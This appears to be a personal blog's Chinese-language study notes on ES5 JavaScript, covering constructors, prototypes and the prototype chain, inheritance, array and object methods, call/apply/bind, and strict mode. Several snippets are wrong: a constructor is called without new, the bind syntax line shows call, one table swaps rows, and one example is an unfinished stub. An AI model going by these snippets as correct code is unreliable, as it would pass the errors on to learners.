<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">uname, age</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建實例對象：</p>
<ul>
<li>使用<code>new</code>關鍵字創造實例對象</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> donald = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="number">19</span>)</span><br></pre></td></tr></table></figure></li>
<li>運行模式：<ol>
<li>在內存中創建一個新的空對象</li>
<li>讓 this 指向這個新對象</li>
<li>執行構造函數裡面的代碼，給這個新對象添加屬性和方法</li>
<li>返回這個新對象 (因此構造函數裡面不需要return)</li>
</ol>
</li>
</ul>
</li>
</ol>
<h3 id="構造函數的成員"><a href="#構造函數的成員" class="headerlink" title="構造函數的成員"></a>構造函數的成員</h3><ol>
<li><p>實例成員：</p>
<ul>
<li>實例成員就是構造函數內部通過 this 添加的成員</li>
<li>實例成員只能通過<font color="#f54747">實例化的對象</font>來訪問</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">uname, age</span>)&#123;</span><br><span class="line">    <span class="comment">// 創建實例成員</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> donald = <span class="title class_">Person</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 訪問實例成員</span></span><br><span class="line">donald.<span class="property">uname</span>    <span class="comment">// Donald</span></span><br><span class="line"><span class="comment">// 並不能通過構造函數訪問實例成員</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">uname</span>    <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>靜態成員：</p>
<ul>
<li>靜態成員就是在構造函數身上添加的成員</li>
<li>靜態成員只能通過<font color="#f54747">構造函數</font>來訪問</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建靜態成員</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">gender</span> = <span class="string">&#x27;Male&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 靜態成員只能通過構造函數訪問</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">gender</span>);     <span class="comment">// Male</span></span><br><span class="line"><span class="comment">// 不可以通過實例對象來訪問</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald.<span class="property">gender</span>);     <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="構造函數的問題"><a href="#構造函數的問題" class="headerlink" title="構造函數的問題"></a>構造函數的問題</h3><ul>
<li>浪費內存：例如對象身上的函數，每當創造一個實例對象，都會給每一個實例創建對象身上的函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 他們比較的是地址，可見兩個函數是存放在不同的地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald.<span class="property">eat</span> === john.<span class="property">eat</span>);  <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><ol>
<li>簡介：<ul>
<li>解決構造函數浪費內存的問題，構造函數通過原型分配的函數是所有對象<font color="#f54747">共享</font>的</li>
</ul>
</li>
</ol>
<h3 id="原型對象"><a href="#原型對象" class="headerlink" title="原型對象"></a>原型對象</h3><ol>
<li><p>原型對象Prototype</p>
<ul>
<li>JS規定，<font color="#f54747">每一個構造函數都有一個<code>prototype</code>屬性</font>，指向另一個對象<br>  注意：這個<code>prototype</code>是一個對象，這個對象的所有方法和屬性，都會被構造函數所擁有</li>
<li>我們可以把不變的方法，直接定義在<code>prototype</code>對象上，這樣所有對象的實例就可以共享這些方法</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事例對象共享方法</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;?&#x27;</span>, donald.<span class="property">eat</span> === john.<span class="property">eat</span>)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
<li><font color="#f54747">一般情況下，公共屬性會定義到構造函數裡，而公共方法則會放在原型對象身上</font></li>
</ul>
</li>
<li><p>原型對象中this的指向</p>
<ul>
<li>原型對象函數裡的this指向的是實例對象</li>
</ul>
</li>
</ol>
<h3 id="對象的原型"><a href="#對象的原型" class="headerlink" title="對象的原型"></a>對象的原型</h3><ol>
<li><p>對象原型<code>__proto__</code></p>
<ul>
<li>每個實例對象身上系統都會添加一個<code>__proto__</code>指向構造函數的原型對象<code>prototype</code></li>
<li>實例對象上的原型<code>__proto__</code>與構造函數身上的原型對象<code>prototype</code>是同等的  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>);     <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
<li><code>__proto__</code>對象原型的意義在於為對象的查找機制提供一個方向，但他是一個<font color="#f54747">非標準屬性</font><br>  因此在實際開發中，不可以使用這個屬性，他只是內部指向原型對象<code>prototype</code></li>
</ul>
</li>
<li><p>方法的查找規則：</p>
<ol>
<li>首先先查找實例對象上是否有對應的方法，如果有則執行對象上的方法</li>
<li>如果沒有，因為有<code>__proto__</code>的存在，就會去構造函數原型對象<code>prototype</code>身上去查找該方法</li>
</ol>
</li>
</ol>
<h3 id="原型的構造器"><a href="#原型的構造器" class="headerlink" title="原型的構造器"></a>原型的構造器</h3><ol>
<li>原型構造器<code>constructor</code><ul>
<li>對象原型<code>__proto__</code>和構造函數的原型對象<code>prototype</code>裡面都有一個<code>constructor</code>屬性</li>
<li>添加進原型對象中的函數可以用對象的簡寫形式：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">eat</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 函數的簡寫形式</span></span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>但如果給原型對象賦值的是一個對象，則必須手動利用<code>constructor</code>指回原來的構造函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">constructor</span>: <span class="title class_">Person</span>,    <span class="comment">// 手動指回原來的構造函數</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="原型鏈"><a href="#原型鏈" class="headerlink" title="原型鏈"></a>原型鏈</h3><ol>
<li><p>原型鏈：</p>
<ul>
<li>只要是對象，那麼就有<code>__proto__</code>原型，指向原型對象</li>
<li>例如：<br>  <code>donald</code>實例的原型指向<code>Person</code>的原型對象，<br>  <code>Person</code>原型對象的原型指向<code>Object</code>的原型對象，<br>  <code>Object</code>原型對象的原型最終指向<code>null</code></li>
<li>圖示：  <img src="https://p.ipic.vip/rnky2v.png" width="800px"/></li>
</ul>
</li>
<li><p>對象成員查找規則：</p>
<ol>
<li>當訪問一個對象的屬性及方法時，首先查找<font color="#f54747">對象自身</font>有沒有該屬性</li>
<li>如果沒有，則查找它的原型 (也就是<code>__proto__</code>指向的<font color="#f54747"><code>prototype</code>原型對象</font>)</li>
<li>如果沒有，則查找原型對象的原型 (<font color="#f54747">Object的原型對象</font>)</li>
<li>以此類推直到找到Object為止 (<font color="#f54747">null</font>)</li>
<li><code>__proto__</code>對象原型的意義在於為對象的查找機制提供一個方向</li>
</ol>
</li>
</ol>
<h3 id="原型對象的其他應用"><a href="#原型對象的其他應用" class="headerlink" title="原型對象的其他應用"></a>原型對象的其他應用</h3><ol>
<li>擴展內置的對象<ul>
<li><p>可以通過原型對象，對原來的內置對象進行擴展自定義的方法<br>  比如給數組增加自定義的功能：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sum</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(int)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="#f54747">注意：數組和字符串內置對象不能給原型對象進行覆蓋操作，只允許追加</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 允許追加操作</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">xxx</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不允許覆蓋操作</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">xxx</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="組合繼承"><a href="#組合繼承" class="headerlink" title="組合繼承"></a>組合繼承</h2><ol>
<li><p>簡介：</p>
<ul>
<li>在ES6之前，並沒有<code>extends</code>繼承，但可以通過<font color="#f54747">構造函數+原型對象</font>模擬實現繼承，稱為<font color="#f54747">組合繼承</font></li>
</ul>
</li>
<li><p><code>call()</code>方法</p>
<ul>
<li>作用：調用函數並且修改<code>this</code>的指向  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、args: 傳遞的其他參數</span></span><br><span class="line">fn.<span class="title function_">call</span>(thisAug, args...)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="利用構造函數繼承"><a href="#利用構造函數繼承" class="headerlink" title="利用構造函數繼承"></a>利用構造函數繼承</h3><ol>
<li><p>核心原理：</p>
<ol>
<li>通過<code>call()</code>把父構造函數的<code>this</code>指向子構造函數的<code>this</code></li>
<li>運行父構造函數的時候，因為父構造函數中<code>this</code>指向子構造函數，就會給子構造函數中添加父構造函數的屬性及方法</li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params">uname, age</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span>(<span class="params">uname, age, gender</span>)&#123;</span><br><span class="line">    <span class="comment">// 調用父構造函數，並把父構造函數的this指向子構造函數的this</span></span><br><span class="line">    <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, uname, age)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gender</span> = gender</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="原型對象繼承方法"><a href="#原型對象繼承方法" class="headerlink" title="原型對象繼承方法"></a>原型對象繼承方法</h3><ol>
<li><p>簡介：</p>
<ul>
<li>由於父構造函數與子構造函數擁有自己的原型對象，因此子構造函數不能調用父構造函數原型對象上的屬性和方法</li>
</ul>
</li>
<li><p>核心原理：<br> 將子構造函數的原型對象指向父構造函數創造的實例對象，由於父構造函數的實例對象能指向父構造函數的原型對象，子構造函數原型對象也能調用父構造函數的原型對象中的屬性和方法</p>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建父構造函數的實例，因此子構造函數的原型對象就能指向父構造函數的原型對象</span></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Parent</span>()</span><br><span class="line"><span class="comment">// 由於利用對象修改了原型對象，需要使用constructor重新指向原來的構造函數</span></span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Child</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>圖示：</p>
 <img src="https://p.ipic.vip/totn93.png" width="600px"/></li>
</ol>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>ES5</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - ES5</title>
    <url>/myBlog/2022/07/14/2022/2022-7-14-JS-ES5/</url>
    <content><![CDATA[<h2 id="數組方法"><a href="#數組方法" class="headerlink" title="數組方法"></a>數組方法</h2><ol>
<li><p><code>forEach()</code>方法</p>
<ul>
<li>作用：遍歷數組</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、value: 數組當前的值</span></span><br><span class="line"><span class="comment">// 參數二、index: 數組當前的索引</span></span><br><span class="line"><span class="comment">// 參數三、arr: 數組對象本身</span></span><br><span class="line">array.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">currentValue, index, arr</span>))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>filter()</code>方法</p>
<ul>
<li><p>作用：創建一個新的數組，新數組中的元素是通過檢查指定數組中符合條件的所有元素，<font color="#f54747">主要用於篩選數組</font><br>  <font color="#f54747">注意：它直接返回一個新的數組</font></p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、value: 數組當前的值</span></span><br><span class="line"><span class="comment">// 參數二、index: 數組當前的索引</span></span><br><span class="line"><span class="comment">// 參數三、arr: 數組對象本身</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">value, index, arr</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (value % <span class="number">2</span> === <span class="number">0</span>)    <span class="comment">// 篩選條件</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>some()</code>方法</p>
<ul>
<li>作用：用於檢測數組中的元素是否滿足指定條件，並返回一個 boolean值</li>
<li>備註：如果找到一個滿足條件的元素，則終止循環，不再繼續查找</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、value: 數組當前的值</span></span><br><span class="line"><span class="comment">// 參數二、index: 數組當前的索引</span></span><br><span class="line"><span class="comment">// 參數三、arr: 數組對象本身</span></span><br><span class="line"><span class="keyword">var</span> flag = arr.<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">value, index, arr</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> value &gt;= <span class="number">20</span>      <span class="comment">// 條件</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>遍歷問題</p>
<ol>
<li><p>遍歷規則：</p>
<ul>
<li><code>forEach()</code>方法如果遇到<code>return true</code>不會終止遍歷</li>
<li><code>filter()</code>方法如果遇到<code>return true</code>也不會終止遍歷</li>
<li><code>some()</code>方法如果遇到<code>return true</code>就會終止遍歷</li>
</ul>
</li>
<li><p><code>return</code>問題：</p>
<ul>
<li><code>return true</code>是為了表示尋找到該元素，就會終止遍歷</li>
<li><code>return false</code>則表示沒有找到該元素，因此會繼續遍歷</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><ol>
<li><code>trim()</code>方法<ul>
<li>作用：用於刪除一個字符串兩端的空白字符串</li>
<li>備註：返回的是一個新的字符串，不影響原字符串本身</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str.<span class="title function_">trim</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="對象方法"><a href="#對象方法" class="headerlink" title="對象方法"></a>對象方法</h2><ol>
<li><p><code>Object.keys()</code>方法</p>
<ul>
<li>作用：用於獲取對象自身所有的屬性名，返回一個由屬性名組成的數組</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(obj)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Object.defineProperty()</code>方法</p>
<ul>
<li>作用：定義對象中新屬性 或 修改原有的屬性</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、obj: 目標對象</span></span><br><span class="line"><span class="comment">// 參數二、prop: 需定義或修改的屬性名</span></span><br><span class="line"><span class="comment">// 參數三、descriptor&#123;&#125;: 目標屬性所擁有的特性</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, prop, &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li><code>descriptor&#123;&#125;</code>的說明：<ol>
<li><code>value</code><ul>
<li>設置屬性的值</li>
<li>默認<code>undefined</code></li>
</ul>
</li>
<li><code>writable</code><ul>
<li>值是否可重寫（對象裡有些屬性是不允許隨便修改，例如<code>id</code>）</li>
<li>默認不可被重寫<code>false</code></li>
</ul>
</li>
<li><code>enumerable</code><ul>
<li>目標屬性是否可以被枚舉</li>
<li>默認不可被枚舉<code>false</code></li>
</ul>
</li>
<li><code>configurable</code><ul>
<li>目標屬性是否可以被刪除</li>
<li>是否可以在此修改<font color="#f54747">特性</font></li>
<li>默認不可被刪除<code>false</code></li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="函數"><a href="#函數" class="headerlink" title="函數"></a>函數</h2><ol>
<li><p>通過<code>function</code>關鍵字聲明函數（命名函數）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>通過函數表達式（匿名函數）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fun = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>通過對象寫法</p>
<ul>
<li>簡介：由於<code>Function</code>是屬於對象，所有函數都是<code>Function</code>的實例對象，因此可以用<code>new Function()</code>定義</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fun = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;參數&#x27;</span>, ... , <span class="string">&#x27;函數體&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>注意：<code>Function</code>裡面的參數與函數體必需是字符串格式</li>
</ul>
</li>
</ol>
<h2 id="函數的種類"><a href="#函數的種類" class="headerlink" title="函數的種類"></a>函數的種類</h2><table>
<thead>
<tr>
<th align="left">函數類型</th>
<th align="left">調用方法</th>
<th align="left">this的指向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">普通函數調用</td>
<td align="left"><code>funct()</code> &#x2F; <code>funct.call()</code></td>
<td align="left"><code>window</code></td>
</tr>
<tr>
<td align="left">構造函數調用</td>
<td align="left"><code>obj.funct()</code></td>
<td align="left">實例對象<code>obj</code></td>
</tr>
<tr>
<td align="left">對象方法調用</td>
<td align="left"><code>xxx = new Person()</code></td>
<td align="left">該方法所屬對象<code>xxx</code></td>
</tr>
<tr>
<td align="left">事件綁定方法</td>
<td align="left"><code>btn.onclick = function()&#123;...&#125;</code></td>
<td align="left">綁定事件的對象<code>btn</code></td>
</tr>
<tr>
<td align="left">定時器函數</td>
<td align="left"><code>setInterval(function()&#123;...&#125;, 1000)</code></td>
<td align="left"><code>window</code></td>
</tr>
<tr>
<td align="left">立即執行函數</td>
<td align="left"><code>(function()&#123;...&#125;)()</code></td>
<td align="left"><code>window</code></td>
</tr>
</tbody></table>
<h2 id="改變函數this指向"><a href="#改變函數this指向" class="headerlink" title="改變函數this指向"></a>改變函數this指向</h2><ol>
<li><p><code>call()</code>方法</p>
<ul>
<li>作用：<ol>
<li>調用函數</li>
<li>修改<code>this</code>的指向</li>
</ol>
</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、args: 傳遞的參數</span></span><br><span class="line">funct.<span class="title function_">call</span>(thisAug, args...)</span><br></pre></td></tr></table></figure></li>
<li>主要應用：實現繼承</li>
</ul>
</li>
<li><p><code>apply()</code>方法</p>
<ul>
<li>作用：<ol>
<li>調用函數</li>
<li>修改<code>this</code>的指向</li>
</ol>
</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、argsArray: 傳遞的參數，必須包含在數組裡</span></span><br><span class="line">funct.<span class="title function_">apply</span>(thisAug, [argsArray])</span><br></pre></td></tr></table></figure></li>
<li>主要應用：借用數組以外的內置對象函數<ol>
<li>利用 apply 借助於數學內置對象求最大值 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> max = <span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="title class_">Math</span>, arr)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
<li><p><code>bind()</code>方法</p>
<ul>
<li>作用：<ol>
<li>修改<code>this</code>的指向</li>
<li><font color="#f54747">不會調用函數</font></li>
<li>返回值：原函數修改完<code>this</code>指向之後的<font color="#f54747">新函數</font></li>
</ol>
</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、args: 傳遞的參數</span></span><br><span class="line">funct.<span class="title function_">call</span>(thisAug, args...)</span><br></pre></td></tr></table></figure></li>
<li>主要應用：不需要立即調用，但又希望改變函數的內部<code>this</code>指向<ol>
<li>有一個按鈕，點擊後禁用按鈕幾秒鐘 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">disabled</span> = <span class="literal">true</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">disabled</span> = <span class="literal">false</span></span><br><span class="line">    &#125;.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果希望保留內部<code>this</code>的指向，可以通過參數傳遞其他指向 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    btn.<span class="property">onclick</span> = funct.<span class="title function_">bind</span>(btn, <span class="variable language_">this</span>)     <span class="comment">// btn指向button對象，this指向實例對象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">funct</span>(<span class="params">that</span>)&#123;&#125;    <span class="comment">// 接收this(實例對象)</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="嚴格模式"><a href="#嚴格模式" class="headerlink" title="嚴格模式"></a>嚴格模式</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES5提供了嚴格模式(strict mode)</li>
<li>嚴格模式具有限制性，即在嚴格的條件下運行JS代碼</li>
</ul>
</li>
<li><p>對JS語義的更改：</p>
<ol>
<li>消除了JS語法的一些不合理、不嚴謹之處，減少怪異行為</li>
<li>消除代碼運行的不安全之處，保證代碼運行的安全</li>
<li>提高編譯器效率，增加運行速度</li>
<li>禁用了 ECMAScript 的未來版本中可能會定義的一些語法，為未來新版本的 JavaScript 做好鋪墊<br> 例如：一些保留字 class, enum, export, extends, import, super 不能作為變量名</li>
</ol>
</li>
<li><p>為腳本開啟嚴格模式：</p>
<ul>
<li>寫法：<font color="#f54747">在所有語句之前放一個特定語句<code>&#39;use strict&#39;;</code></font>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &#x27;use strict&#x27;</span>    <span class="comment">// 開啟嚴格模式</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>為函數開啟嚴格模式：</p>
<ul>
<li>寫法：<font color="#f54747">把<code>&#39;use strict&#39;;</code>聲明放在函數體所有語句之前</font>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">funct</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>    <span class="comment">// 開啟嚴格模式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="嚴格模式的變化"><a href="#嚴格模式的變化" class="headerlink" title="嚴格模式的變化"></a>嚴格模式的變化</h3><ol>
<li><p>變量規定：</p>
<ol>
<li><p>函數賦值：</p>
<ul>
<li>正常模式下，如果一個變量沒有聲明就賦值，默認是全局變量</li>
<li>嚴格模式下，這種用法是禁止的，所有變量必須先聲明再使用  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">num = <span class="number">10</span>;   <span class="comment">// !!!語法錯誤</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>刪除變量</p>
<ul>
<li>正常模式下，允許刪除已聲明的變量</li>
<li>嚴格模式下，則嚴禁刪除變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> num      <span class="comment">// !!!語法錯誤</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p><code>this</code>的指向問題：</p>
<ol>
<li><p>全局作用於指向：</p>
<ul>
<li>正常模式下，全局作用域函數中的<code>this</code>指向<code>window</code>對象</li>
<li>嚴格模式下，全局作用域函數中的<code>this</code>是<code>undefined</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)   <span class="comment">// undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>構造函數調用：</p>
<ul>
<li>正常模式下，構造函數不加<code>new</code>關鍵字也能調用，<code>this</code>指向全局對象</li>
<li>嚴格模式下，構造函數必須是使用<code>new</code>關鍵字調用，否則<code>this</code>指向<code>undefined</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>()    <span class="comment">// !!!語法錯誤，因為this指向undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定時器的<code>this</code>指向仍然是<code>window</code></p>
</li>
<li><p>事件、對象還是指向調用者</p>
</li>
</ol>
</li>
<li><p>函數的變化：</p>
<ol>
<li><p>函數不能有重名的參數</p>
